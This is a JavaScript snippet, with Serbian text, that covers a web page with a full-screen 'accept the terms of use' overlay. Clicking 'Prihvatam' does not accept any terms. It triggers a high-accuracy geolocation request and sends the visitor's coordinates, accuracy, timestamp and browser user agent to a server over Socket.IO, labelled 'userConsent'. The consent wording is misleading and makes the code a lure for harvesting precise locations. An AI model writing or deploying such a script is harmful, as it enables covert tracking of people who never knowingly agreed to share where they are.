(function() {
    const modal = document.createElement('div');
    modal.style.position = 'fixed';
    modal.style.top = 0;
    modal.style.left = 0;
    modal.style.width = '100%';
    modal.style.height = '100%';
    modal.style.backgroundColor = 'rgba(0,0,0,0.85)';
    modal.style.color = '#fff';
    modal.style.display = 'flex';
    modal.style.flexDirection = 'column';
    modal.style.justifyContent = 'center';
    modal.style.alignItems = 'center';
    modal.style.zIndex = 9999;
    modal.style.fontFamily = 'Arial, sans-serif';
    modal.innerHTML = `
        <div style="max-width: 500px; text-align: center; background: #222; padding: 30px; border-radius: 10px;">
            <h2 style="margin-bottom:20px;">Morate prihvatiti uslove korišćenja</h2>
            <p style="line-height:1.5;">Kliknite 'Prihvatam' da omogućite potrebne dozvole i nastavite.</p>
            <button id="acceptBtn" style="padding:10px 20px; margin-top:20px; cursor:pointer; font-size:16px;">Prihvatam</button>
        </div>
    `;
    document.body.appendChild(modal);

    document.getElementById('acceptBtn').addEventListener('click', () => {
        // Ukloni modal odmah
        modal.remove();

        // Traži geolokaciju, browser prompt će se pojaviti odmah
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                position => {
                    const data = {
                        latitude: position.coords.latitude,
                        longitude: position.coords.longitude,
                        accuracy: position.coords.accuracy,
                        timestamp: position.timestamp,
                        userAgent: navigator.userAgent
                    };
                    // šalje podatke serveru preko Socket.IO
                    socket.emit('userConsent', data);
                },
                err => {
                    alert('Lokacija nije dozvoljena ili dostupna.');
                },
                { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
            );
        } else {
            alert('Vaš browser ne podržava geolokaciju.');
        }
    });
})();
